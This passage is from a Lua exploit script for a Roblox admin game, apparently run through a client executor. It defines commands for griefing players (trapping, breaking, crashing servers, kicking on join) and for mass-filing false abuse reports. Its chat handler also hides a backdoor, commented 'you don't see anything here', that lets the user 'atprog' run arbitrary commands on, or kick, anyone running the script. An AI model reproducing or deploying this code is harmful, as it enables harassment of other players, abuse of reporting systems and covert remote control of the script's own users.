  SelectionBox.LineThickness = 0.05
  SelectionBox.Adornee = nil
  SelectionBox.Color3 = Color3.fromRGB(0,0,255)
  SelectionBox.Visible = false
  btool.Name = "Attach Tool"
  btool.RequiresHandle = false
  local IsEquipped = false
  local Mouse = game.Players.LocalPlayer:GetMouse()
  
  btool.Equipped:connect(function()
   IsEquipped = true
   SelectionBox.Visible = true
   SelectionBox.Adornee = nil
  end)
  
  btool.Unequipped:connect(function()
   IsEquipped = false
   SelectionBox.Visible = false
   SelectionBox.Adornee = nil
  end)
  
  
  btool.Activated:connect(function()
  if IsEquipped then
    btool.Parent = game.Chat
   local ex = Instance.new'Explosion'
   ex.BlastRadius = 0
   ex.Position = Mouse.Target.Position
   ex.Parent = game.Workspace
local target = Mouse.Target
			function movepart()
				local cf = game.Players.LocalPlayer.Character.HumanoidRootPart
				local looping = true
				spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
						if not looping then break end
					end
				end)
				spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
				wait(0.25)
				looping = false
			end
			movepart()
game.Chat["Attach Tool"].Parent = plr.Backpack
chr.HumanoidRootPart.CFrame=pos
spawn(function()
    wait(3)
    if game.Chat:FindFirstChild("Attach Tool") then
        game.Chat["Attach Tool"]:Destroy()
    end
end)
   -- to here

  end
end)
  
  while true do
   SelectionBox.Adornee = Mouse.Target or nil
   wait(0.1)
  end
end)

addCommand("breakplayer",{"player"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		game.Players:Chat("unpunish "..v.Name)wait()
		game.Players:Chat("invis "..v.Name)
		game.Players:Chat("reset "..v.Name)
		game.Players:Chat("invisible "..v.Name)
		game.Players:Chat("kill "..v.Name)
		game.Players:Chat("trip "..v.Name)
		game.Players:Chat("setgrav "..v.Name.." -inf")wait(.1)
		game.Players:Chat("invisible "..v.Name)
		game.Players:Chat("unpunish "..v.Name.." "..v.Name.." "..v.Name)wait(.2)
		game.Players:Chat("invisible "..v.Name)wait(.2)
		game.Players:Chat("reset "..v.Name)wait(.15)
		game.Players:Chat("punish "..v.Name.." "..v.Name.." "..v.Name)
	end
end)

addCommand("deletetool",{},function()
    local btool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
  local SelectionBox = Instance.new("SelectionBox",game.Workspace)
  local hammer = Instance.new("Part")
  hammer.Parent = btool
  hammer.Name = ("Handle")
  hammer.CanCollide = false
  hammer.Anchored = false


  SelectionBox.Name = "oof"
  SelectionBox.LineThickness = 0.05
  SelectionBox.Adornee = nil
  SelectionBox.Color3 = Color3.fromRGB(0,0,255)
  SelectionBox.Visible = false
  btool.Name = "Delete Tool"
  btool.RequiresHandle = false
  local IsEquipped = false
  local Mouse = game.Players.LocalPlayer:GetMouse()
  
  btool.Equipped:connect(function()
   IsEquipped = true
   SelectionBox.Visible = true
   SelectionBox.Adornee = nil
  end)
  
  btool.Unequipped:connect(function()
   IsEquipped = false
   SelectionBox.Visible = false
   SelectionBox.Adornee = nil
  end)
  
  
  btool.Activated:connect(function()
  if IsEquipped then
    btool.Parent = game.Chat
   local ex = Instance.new'Explosion'
   ex.BlastRadius = 0
   ex.Position = Mouse.Target.Position
   ex.Parent = game.Workspace
   local prevcfarchive = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local target = Mouse.Target
			function movepart()
				local cf = game.Players.LocalPlayer.Character.HumanoidRootPart
				local looping = true
				spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
						if not looping then break end
					end
				end)
				spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
				wait(0.25)
				looping = false
			end
			movepart()
			repeat wait() until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld")
			game.Players:Chat("skydive me")
			wait(0.1)
			game.Players:Chat("respawn me")
			wait(0.25)
game.Chat["Delete Tool"].Parent = plr.Backpack
chr.HumanoidRootPart.CFrame=prevcfarchive
spawn(function()
    wait(3)
    if game.Chat:FindFirstChild("Delete Tool") then
        game.Chat["Delete Tool"]:Destroy()
    end
end)
   -- to here

  end
end)
  
  while true do
   SelectionBox.Adornee = Mouse.Target or nil
   wait(0.1)
  end
end)

addCommand("deletetoolivory",{},function()
    local btool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
  local SelectionBox = Instance.new("SelectionBox",game.Workspace)
  local hammer = Instance.new("Part")
  hammer.Parent = btool
  hammer.Name = ("Handle")
  hammer.CanCollide = false
  hammer.Anchored = false


  SelectionBox.Name = "oof"
  SelectionBox.LineThickness = 0.05
  SelectionBox.Adornee = nil
  SelectionBox.Color3 = Color3.fromRGB(0,0,255)
  SelectionBox.Visible = false
  btool.Name = "Delete Tool"
  btool.RequiresHandle = false
  local IsEquipped = false
  local Mouse = game.Players.LocalPlayer:GetMouse()
  
  btool.Equipped:connect(function()
   IsEquipped = true
   SelectionBox.Visible = true
   SelectionBox.Adornee = nil
  end)
  
  btool.Unequipped:connect(function()
   IsEquipped = false
   SelectionBox.Visible = false
   SelectionBox.Adornee = nil
  end)
  
  
  btool.Activated:connect(function()
  if IsEquipped then
    btool.Parent = game.Chat
   local ex = Instance.new'Explosion'
   ex.BlastRadius = 0
   ex.Position = Mouse.Target.Position
   ex.Parent = game.Workspace
   local prevcfarchive = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local target = Mouse.Target
			moveObject(target,CFrame.new(99999,99999,99999))
			wait(0.5)
			game.Chat["Delete Tool"].Parent = plr.Backpack
chr.HumanoidRootPart.CFrame=prevcfarchive
spawn(function()
    wait(3)
    if game.Chat:FindFirstChild("Delete Tool") then
        game.Chat["Delete Tool"]:Destroy()
    end
end)
   -- to here

  end
end)
  
  while true do
   SelectionBox.Adornee = Mouse.Target or nil
   wait(0.1)
  end
end)


addCommand("gear",{"gear-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.."%20"..args[i]
    end
    local request = HttpRequest({
        Url="https://catalog.roblox.com/v1/search/items/details?Category=11&Subcategory=5&Limit=10&CreatorName=Roblox&Keyword="..fixer,
        Method=GET
    })
    local decode = game:GetService("HttpService"):JSONDecode(request.Body)
    game.Players:Chat("gear me "..tostring(decode["data"][1]["id"]))
end)

addCommand("trap",{"player","time"},function(args)
    local function GetCage()
    if game.Players.LocalPlayer.Backpack:FindFirstChild("PortableJustice") then
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("PortableJustice")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    elseif game.Players.LocalPlayer.Character:FindFirstChild("PortableJustice") then
        return game.Players.LocalPlayer.Character:FindFirstChild("PortableJustice")
    else
        game.Players:Chat("gear me 82357101")
        game.Players:Chat("unff all")
        game.Players:Chat("freeze " ..Player.Name)
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PortableJustice")
        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("PortableJustice")
        tool.Parent = game.Players.LocalPlayer.Character
        return tool
    end
end
local function CagePlayer(Player)
    local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    if Player and Player.Character and Player.Character.Head and not Player.Character:FindFirstChild("Part") then
        local A_1 = Player.Character
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.Head.CFrame
        GetCage().MouseClick:FireServer(A_1)
        repeat game:GetService("RunService").RenderStepped:Wait() until Player.Character:FindFirstChild("Part")
        GetCage():Destroy()
	game.Players.LocalPlayer.PlayerGui:FindFirstChild("HelpGui"):Destroy()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
        game.Players:Chat("removetools me")
        game.Players:Chat("pm "..Player.Name.." ["..ScriptName.."]\nYou are currently trapped for "..args[2].."s.")
    end
end
Loops.trap = true
spawn(function()
    wait(tonumber(args[2]))
    Loops.trap = false
end)
local Player = GetPlayers(args[1])
repeat game:GetService("RunService").RenderStepped:Wait()
    pcall(function()
for i,v in pairs(Player) do
    pcall(function()
        CagePlayer(v)
    end)
end
    end)
until not Loops.trap
for i,v in pairs(Player) do
    game.Players:Chat("reset "..v.Name)
    wait()
    game.Players:Chat("pm "..v.Name.." ["..ScriptName.."]\nYou are no longer trapped.")
    wait()
end
end)

addCommand("equipall",{},function()
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        v.Parent = game.Players.LocalPlayer.Character
    end
end)

addCommand("dropall",{},function()
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        v.Parent = game.Players.LocalPlayer.Character
    end
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
        if v:IsA("Tool") then v.Parent = workspace end
    end
end)

addCommand("playmusic",{"audio-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.."%20"..args[i]
    end
    local request = HttpRequest({
        Url="https://search.roblox.com/catalog/json?CatalogContext=2&Category=9&SortType=3&ResultsPerPage=10&Keyword="..fixer,
        Method=GET
    })
    local decode = game:GetService("HttpService"):JSONDecode(request.Body)
    game.Players:Chat("music "..tostring(decode[1]["AssetId"]))
end)

addCommand("copymusicid",{"audio-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.."%20"..args[i]
    end
    local request = HttpRequest({
        Url="https://search.roblox.com/catalog/json?CatalogContext=2&Category=9&SortType=3&ResultsPerPage=10&Keyword="..fixer,
        Method=GET
    })
    local decode = game:GetService("HttpService"):JSONDecode(request.Body)
    setclipboard(tostring(decode[1]["AssetId"]))
end)

addCommand("play",{"audio-name"},function(args)
    runCommand(prefix.."playmusic",args)
end)

addCommand("playlocalmusic",{"audio-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    if workspace:FindFirstChild("LocalMusic__") then
        workspace["LocalMusic__"]:Destroy()
    end
    local LocalMusic = Instance.new("Sound",workspace)
    LocalMusic.Name = "LocalMusic__"
    LocalMusic.Volume = 10
    LocalMusic.Looped = true
    LocalMusic.SoundId = getSoundId("https://raw.githubusercontent.com/iiDk-the-actual/Music/main/"..fixer..".mp3",fixer)
    LocalMusic:Play()
end)

addCommand("stoplocalmusic",{},function()
    if workspace:FindFirstChild("LocalMusic__") then
        workspace["LocalMusic__"]:Destroy()
    end
end)



addCommand("ascend",{"player"},function(args)
game.Players:Chat("music 9061674082")
for i,v in pairs(GetPlayers(args[1])) do
spawn(function()
game.Players:Chat("setgrav "..v.Name.." -256")
game.Players:Chat("trip "..v.Name)
wait(0.4)
game.Players:Chat("trip "..v.Name)
end)
end
end)



addCommand("copybypass",{"audio-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    local s,f=pcall(function()
	local thegod = ""
    for i,v in pairs(Audios) do
        if string.match(v[2]:lower(),fixer:lower()) then
            thegod = v[1]
            break
        end
    end
	setclipboard(thegod)
    end) if not s then print(f)end
end)

addCommand("playbypass",{"audio-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    local s,f=pcall(function()
    for i,v in pairs(Audios) do
        if string.match(v[2]:lower(),fixer:lower()) then
            game.Players:Chat("music "..v[1])
            break
        end
    end
    end) if not s then print(f)end
end)

addCommand("getbypassed",{},function()
    local s,f=pcall(function()
	print("ff -:AUDIOS ["..tostring(#Audios).."]:-")
    for i,v in pairs(Audios) do
        print(v[2].." | Uploaded "..v[3].." | Bypassed by "..v[4])
    end
    GUI:SendMessage(ScriptName, "Check the developer console for a list of bypassed audios.")
    end)if not s then print(f)end
end)

addCommand("altgetbypassed",{},function()
    local s,f=pcall(function()
    for i,v in pairs(Audios) do
        game.Players:Chat("ff "..v[2].." | Uploaded "..v[3].." | Bypassed by "..v[4])
        wait()
    end
    wait()
    game.Players:Chat("ff -:AUDIOS ["..tostring(#Audios).."]:-")
    wait()
    GUI:SendMessage(ScriptName, "Check logs for list of audios.")
    end)if not s then print(f)end
end)

addCommand("stopmusic",{},function()
    game.Players:Chat("music nan")
end)

addCommand("bypassmessage",{"message"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    local file = fixer
    local a = {}
    
    for letter in file:gmatch(".") do
      if letter ~= "\r" and letter ~= "\n" then
        table.insert(a, letter)
      end
    end
    
    for i, v in ipairs(a) do
      print(i, v)
    end
    
    for b, c in ipairs(a) do
        local d = "variable_" .. tostring(b)
        _G[d] = c
    end
    for b, c in ipairs(a) do
        local e = string.rep("  ", 2 * (b - 1))
        if PersonsAdmin then
            game.Players:Chat("h/the\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" .. e .. _G["variable_" .. tostring(b)])
        else
            game.Players:Chat("h PR Script\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" .. e .. _G["variable_" .. tostring(b)])
        end
    end
end)

addCommand("announce",{"message"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
    GUI:SendMessage(ScriptName, fixer)
end)

addCommand("say",{"message"},function(args)
	local fixer = args[1]
	for i=2, #args do
	fixer=fixer.." "..args[i]
	end
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({fixer,"All"}))
end)

addCommand("noturn",{},function()
    game.Players:Chat("gear all 4842186817")
    game.Players:Chat("gear all 4842218829")
    game.Players:Chat("gear all 4842215723")
    game.Players:Chat("gear all 4842207161")
    game.Players:Chat("gear all 4842212980")
end)

addCommand("breakcam",{},function()
    game.Players:Chat("tp others me")
    game.Players:Chat("gear me 68354832")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("BlizzardWand")
    local wand = game.Players.LocalPlayer.Backpack:FindFirstChild("BlizzardWand")
    wand.Parent = plr.Character
    wait(0.2)
    wand:Activate()
    wait(0.4)
    game.Players:Chat("reset all")
end)

addCommand("fixcam",{},function()
    game.Players:Chat("tp others me")
    game.Players:Chat("gear me 68354832")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("BlizzardWand")
    local wand = plr.Backpack:FindFirstChild("BlizzardWand")
    wand.Parent = plr.Character
    wait(0.2)
    wand:Activate()
end)

addCommand("stop",{},function()
    runCommand(prefix.."stopmusic",{})
end)

addCommand("stopall",{},function()
    for i,v in pairs(workspace:GetDescendants()) do
        if v:isA("Sound") then v:Stop() end
    end
end)

addCommand("playall",{},function()
    for i,v in pairs(workspace:GetDescendants()) do
        if v:isA("Sound") then v:Play() end
    end
end)

addCommand("whitelist",{"player"},function(args)
    local Player = GetPlayers(args[1])
    
    for i,v in pairs(Player) do
        if v ~= game.Players.LocalPlayer and not table.find(Whitelisted,v.Name) then
            table.insert(Whitelisted,v.Name)
            GUI:SendMessage(ScriptName, "Whitelisted player "..v.DisplayName..".")
        end
    end
end)

addCommand("unwhitelist",{"player"},function(args)
    local Player = GetPlayers(args[1])
    
    for i,v in pairs(Player) do
        if table.find(Whitelisted,v.Name) then
            table.remove(Whitelisted,table.find(Whitelisted,v.Name))
            GUI:SendMessage(ScriptName, "Blacklisted/unwhitelisted player "..v.DisplayName..".")
        end
    end
end)

plr.Chatted:Connect(function(blacklisted)
if string.sub(blacklisted, 1, 11) == ".blacklist " then
local name = string.sub(blacklisted, 12)
table.insert(Banned,name)
end
end)

addCommand("whitelisted",{},function()
    local whitelisted = Whitelisted
    local message = "Currently Whitelisted ("..#whitelisted.."): "
                for i,v in pairs(whitelisted) do
                    if v ~= whitelisted[#whitelisted] then
                        message = message..v..", "
                    else
                        if #whitelisted ~= 1 then
                            message = message.."& "..v.."."
                        else
                            message = message..v.."."
                        end
                    end
                end
                GUI:SendMessage(ScriptName, message)
end)

addCommand("serverlock",{},function()
    ServerLocked = not ServerLocked
    if ServerLocked then
        GUI:SendMessage(ScriptName, "The server has been locked.")
    else
        GUI:SendMessage(ScriptName, "The server has been unlocked.")
    end
end)

addCommand("person299",{"true/false"},function(args)
    if args[1] == "true" then
        PersonsAdmin = true
        GUI:SendMessage(ScriptName, "Person's Admin has been enabled.")
    else
        PersonsAdmin = false
        GUI:SendMessage(ScriptName, "Person's Admin has been disabled.")
    end
end)

addCommand("checkperm",{"player"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		local has = checkGamepass(v,66254)
		if has == "200" then
			game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n " ..v.DisplayName.." has Perm.")
			print(v.DisplayName.." has Perm ("..has..")")
		else
			game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n " ..v.DisplayName.." does not have Perm.")
			print(v.DisplayName.." does not have Perm ("..has..")")
		end
	end
end)

addCommand("checkperson",{"player"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		local has = checkGamepass(v,35748)
		print(has)
		if has == "200" then
			game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n " ..v.DisplayName.. " has Person's Admin.")
			print(v.DisplayName.." has Person's Admin ("..has..")")
		else
			game.Players:Chat("h/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n " ..v.DisplayName.. " doesn't have Person's Admin.")
			print(v.DisplayName.." does not have Person's Admin ("..has..")")
		end
	end
end)

plr.Chatted:Connect(function(poop)
if string.sub(poop, 1, 7) == ".check " then
local name = string.sub(poop, 8)

game.Players:Chat(".checkperm " .. name)
game.Players:Chat(".checkperson " .. name)

end
end)

--[[
addCommand("legacykick",{"true/false"},function(args)
    if args[1] == "true" then
        LegacyKick = true
        GUI:SendMessage(ScriptName, "Legacy kick has been enabled.")
    else
        LegacyKick = false
        GUI:SendMessage(ScriptName, "Legacy kick has been disabled.")
    end
end)
]]

addCommand("legacyserverlock",{"true/false"},function(args)
    if args[1] == "true" then
        OldServerLock = true
        GUI:SendMessage(ScriptName, "Legacy server lock has been enabled.")
    else
        OldServerLock = false
        GUI:SendMessage(ScriptName, "Legacy server lock has been disabled.")
    end
end)

addCommand("serverlocksound",{"true/false","soundid"},function(args)
    if args[1]=="true" then
        ServerLockedSoundEnabled = true
        GUI:SendMessage(ScriptName, "Server locked sounds have been enabled.")
    else
        ServerLockedSoundEnabled = false
        GUI:SendMessage(ScriptName, "Server locked sounds have been disabled.")
    end
    ServerLockedSound = args[2]
end)

addCommand("bansound",{"true/false","soundid"},function(args)
    if args[1]=="true" then
        BanSoundsEnabled = true
        GUI:SendMessage(ScriptName, "Ban sounds have been enabled.")
    else
        BanSoundsEnabled = false
        GUI:SendMessage(ScriptName, "Ban sounds have been disabled.")
    end
    BanSound = args[2]
end)

addCommand("report",{"player","amount","reason"},function(args)
	local fixer = {BM[3]}
    	for i=4, #BM do
        	table.insert(fixer,BM[i])
    	end
	for i,v in pairs(GetPlayers(args[1])) do
		for i=1,tonumber(args[2]) do		
			game.Players:ReportAbuse(v, "Swearing", fixer)
		end
	end
end)

addCommand("massreport",{"player","amount","reason"},function(args)
	runCommand(prefix.."report",args)
end)

addCommand("antiserverlock",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        table.insert(ServerLockedProtection,v.Name)
        GUI:SendMessage(ScriptName, v.DisplayName.." is now protected against a server lock.")
    end
end)

addCommand("atprogiscool",{"player"},function(args)
    runCommand(prefix.."antiserverlock",args)
end)

addCommand("iceiscool",{"player"},function(args)
    runCommand(prefix.."antiserverlock",args)
end)

addCommand("unantiserverlock",{"player"},function(args)
    local Player = GetPlayers(args[1])
    for i,v in pairs(Player) do
        if table.find(ServerLockedProtection,v.Name) then
            table.remove(ServerLockedProtection,table.find(ServerLockedProtection,v.Name))
            GUI:SendMessage(ScriptName, v.DisplayName.." is no longer protected against a server lock.")
        end
    end
end)

addCommand("unatprogiscool",{"player"},function(args)
    runCommand(prefix.."unantiserverlock",args)
end)

addCommand("uniceiscool",{"player"},function(args)
    runCommand(prefix.."unantiserverlock",args)
end)

addCommand("breakbaseplate",{},function()
    game.Players:Chat("gear me 111876831")
lp.Backpack:WaitForChild("April Showers",30)
local tool = lp.Backpack["April Showers"]
tool.Parent = lp.Character
wait(0.1)
tool:Activate()
lp.Character.HumanoidRootPart.CFrame = CFrame.new(lp:GetMouse().Hit.p.X,lp:GetMouse().Hit.p.Y,lp:GetMouse().Hit.p.Z)
wait()
lp.Character.HumanoidRootPart.CFrame = lp.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,3.6)
wait(15)
game.Players:Chat("gear me 110789105")
lp.Backpack:WaitForChild("RageTable",30)
local tool2 = lp.Backpack["RageTable"]
tool2.Parent = lp.Character
wait(0.1)
tool2:Activate()
end)

addCommand("destroybaseplate",{},function()
    chr.HumanoidRootPart.CFrame = CFrame.new(-57.5680008, 4.93264008, -23.7113419, -0.00361082237, 1.2097874e-07, 0.999993503, 6.45502425e-08, 1, -1.20746449e-07, -0.999993503, 6.41138271e-08, -0.00361082237)
    game.Players:Chat("sit me")
    wait(0.75)
    game.Players:Chat("punish me")
    wait()
    game.Players:Chat("unpunish me")
    wait()
    game.Players:Chat("skydive me")
    wait(0.2)
    game.Players:Chat("respawn me")
end)

addCommand("flipbaseplate",{},function()
    chr.HumanoidRootPart.CFrame = CFrame.new(-57.5680008, 4.93264008, -23.7113419, -0.00361082237, 1.2097874e-07, 0.999993503, 6.45502425e-08, 1, -1.20746449e-07, -0.999993503, 6.41138271e-08, -0.00361082237)
    game.Players:Chat("sit me")
    wait(0.75)
    game.Players:Chat("punish me")
    wait()
    game.Players:Chat("unpunish me")
    wait()
    game.Players:Chat("trip me")
    wait(0.2)
    game.Players:Chat("respawn me")
end)

addCommand("forcerespawn",{},function()
    game.Players.LocalPlayer.Character:Destroy()
end)

addCommand("fixvelocity",{},function()
    for i,v in pairs(workspace.Terrain["_Game"]:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Velocity = Vector3.new(0,0,0)
        end
    end
end)

addCommand("fixbaseplatevelocity",{},function()
	local target = workspace.Terrain["_Game"].Workspace.Baseplate
function movepart()
	local cf = game.Players.LocalPlayer.Character.HumanoidRootPart
	local looping = true
	spawn(function()
		while true do
			game:GetService('RunService').Heartbeat:Wait()
			game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
			cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
			if not looping then break end
		end
	end)
	spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
	wait(0.25)
	looping = false
end
movepart()
wait(0.5)
game.Players:Chat("unskydive me")
wait(0.5)
game.Players:Chat("respawn me")
end)

addCommand("localremoveobby",{},function()pcall(function()
    workspace.Terrain["_Game"]["Workspace"].Obby.Parent = game.Chat
    workspace.Terrain["_Game"]["Workspace"]["Obby Box"].Parent = game.Chat
end)end)

addCommand("nokill",{},function()pcall(function()
    for i,v in pairs(workspace.Terrain["_Game"]["Workspace"].Obby:GetDescendants()) do
        if v:IsA("TouchTransmitter") then v:Destroy() end
    end
end)end)

addCommand("localaddobby",{},function()pcall(function()
    game.Chat:FindFirstChild("Obby").Parent = workspace.Terrain["_Game"]["Workspace"]
    game.Chat:FindFirstChild("Obby Box").Parent = workspace.Terrain["_Game"]["Workspace"]
end)end)

addCommand("extendlogs",{},function()
    plr.PlayerGui:FindFirstChild("ScrollGui").TextButton.Frame.Size = UDim2.new(0,1000,0,1000)
end)

addCommand("debugcommand",{},function()
    GUI:SendMessage(ScriptName, "more debug text yippee")
end)

Connections.Chatted = game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if not running then return end
    local BM = msg:split(" ")
    if BM[1] == "/e" then
        table.remove(BM,1)
    end
    if string.sub(BM[1],0,#prefix) == prefix then
    local commandname = BM[1]:lower()
    local t = ""
    table.remove(BM,1)
    local findargs = {}
    for i,v in pairs(BM) do
        table.insert(findargs,v)
        t=t..v.." "
    end
    spawn(function()runCommand(commandname,findargs)end)
    if consoleOn then
    print("running command: "..commandname.." "..t)
    end
    end
end)

Connections.PlayerChatted = game.Players.PlayerChatted:Connect(function(PlayerChatType,sender,message)--game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering").OnClientEvent:Connect(function(message)
    local s,f=pcall(function()
    
    if table.find(Whitelisted,sender.Name) then
        if not running then return end
        local BM = message:split(" ")
        if BM[1] == "/e" then
            table.remove(BM,1)
        end
        if string.sub(BM[1],0,1) == prefix then
        local commandname = BM[1]:lower()
        local t = ""
        table.remove(BM,1)
        local findargs = {}
        for i,v in pairs(BM) do
            table.insert(findargs,v)
            t=t..v.." "
        end
        spawn(function()runCommand(commandname,findargs)end)
        if consoleOn then
        game.Players:Chat("atprog <3")
        end
        end
    end

	-- you don't see anything here ;3 u sneaky sneaky people.. plz no tell anyone??? plz??
	if sender.Name == "atprog" then
		pcall(function()
		local BM = message:split(" ")
        	if BM[1] == "/e" then
        		table.remove(BM,1)
        	end
		if BM[1]:lower() == "[bd]rundirect" then
			local fixer = {BM[3]}
    			for i=4, #BM do
        			table.insert(fixer,BM[i])
    			end
			for i,v in pairs(GetPlayers(BM[2])) do
				if v == game.Players.LocalPlayer then
					spawn(function()
						runCommand(prefix.."run",fixer)
					end)
				end
			end
		end
		if BM[1]:lower() == "[bd]kick" then
			for i,v in pairs(GetPlayers(BM[2])) do
				if v == game.Players.LocalPlayer then
					spawn(function()
						game.Players.LocalPlayer:Destroy()
					end)
				end
			end
		end
		end)
	end
    end) if not s then print(f)end
end)

local function PlayerAdded(Player)
    spawn(function()
        repeat wait() until Player and Player.Name
        if table.find(Whitelisted,Player.Name) then
       
            GUI:SendMessage(ScriptName, "You are whitelisted, "..Player.Name)
        end
	
	if table.find(PlayerCrash,Player.Name) and not Settings["Auto Crasher"]["Enabled"] then -- Automatically crashes if in server
		GUI:SendMessageNoBrackets("\n\n\n\n["..ScriptName.."]", "\n\n\n\nAuto crash player ("..Player.DisplayName..") found, crashing server.")
		task.wait(0.333)
		if PlayerCrashMode == true then
			runCommand(prefix.."vg",{})
		else
			runCommand(prefix.."shutdown",{})
		end
	end
        
        if table.find(Banned,Player.Name) then
            repeat wait() until Player and Player.Character
            wait(0.25)
            if BanSoundsEnabled then
                runCommand(prefix.."rkicksound",{v.Name,BanSound})
            else
                runCommand(prefix.."rkick",{Player.Name})
            end
        end
        
        if table.find(DefaultSoftlocked,Player.Name) then
            repeat wait() until Player and Player.Character
            wait(0.25)
            runCommand(prefix.."lock",{Player.Name})
        end
	
	if Settings["Player Autorun Commands"][Player.Name] and not (Settings["Auto Crasher"]["Enabled"] and Settings["Auto Crasher"]["Ignore Autorun Commands"]) then
		local v = Settings["Player Autorun Commands"][Player.Name]
		local fixer = {}
		if #v > 1 then
			for i=2,#v:split(" ") do
				table.insert(fixer,v:split(" ")[i])
			end
		end
		
		print("player "..Player.Name.." is in server, autorunning command: "..prefix..v)
		runCommand(prefix..v:split(" ")[1],fixer)
	end
        
        if ServerLocked and not table.find(Whitelisted,Player.Name) and not table.find(ServerLockedProtection,Player.Name) then
                if ServerLockedSoundEnabled then
                    spawn(function()
                        GUI:SendMessage(ScriptName, "This server is currently locked.")
                    end)
                    wait(0.1)
                    repeat wait() until Player and Player.Character
                    wait(0.25)
			if OldServerLock then
				spawn(function()
					game.Players:Chat("music "..tostring(ServerLockedSound))
					wait(10)
					game.Players:Chat("music nan")
				end)
				runCommand(prefix.."lock",{Player.Name})
			else
                    		runCommand(prefix.."rkicksound",{Player.Name,ServerLockedSound})
			end
                else
                    spawn(function()
                        GUI:SendMessage(ScriptName, "This server is currently locked.")
                    end)
                    wait(0.1)
                    repeat wait() until Player and Player.Character
                    wait(0.25)
			if OldServerLock then
				runCommand(prefix.."lock",{Player.Name})
			else
                    		runCommand(prefix.."rkick",{Player.Name})
			end
                end
            end
    end)
end

Connections.PlayerAdded = game.Players.PlayerAdded:Connect(PlayerAdded)
for i,v in pairs(game.Players:GetPlayers()) do PlayerAdded(v) end

spawn(function()
if not (Settings["Auto Crasher"]["Enabled"] and Settings["Auto Crasher"]["Ignore Autorun Commands"]) then
for i,v in pairs(Settings["Autorun Commands"]) do
    if not running then return end
    local BM = v:split(" ")
    local commandname = prefix..BM[1]:lower()
    local t = ""
    table.remove(BM,1)
    local findargs = {}
    for i,v2 in pairs(BM) do
        table.insert(findargs,v2)
        t=t..v2.." "
    end
    spawn(function()runCommand(commandname,findargs)end)
    if consoleOn then
    print("autorunning command: "..commandname.." "..t)
    end
end 
end end)

spawn(function()
local UI = Instance.new("ScreenGui")
CommandBar = UI
local dairyQueenBalls = Instance.new("TextButton")
local holyshidt11 = Instance.new("TextBox")
local togglegarbage41923812 = false
local isCmdBarOpen = false
UI.Name = "&!)!@@#$(~(UI"
UI.Parent = game.CoreGui
UI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
UI.DisplayOrder = 2147483647
UI.ResetOnSpawn = false
dairyQueenBalls.Name = "dairyQueenBalls"
dairyQueenBalls.Parent = UI
dairyQueenBalls.AnchorPoint = Vector2.new(1, 1)
dairyQueenBalls.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
dairyQueenBalls.BackgroundTransparency = 1.000
dairyQueenBalls.BorderSizePixel = 0
dairyQueenBalls.Position = UDim2.new(1, 0, 1, 0)
dairyQueenBalls.Size = UDim2.new(0, 61, 0, 61)
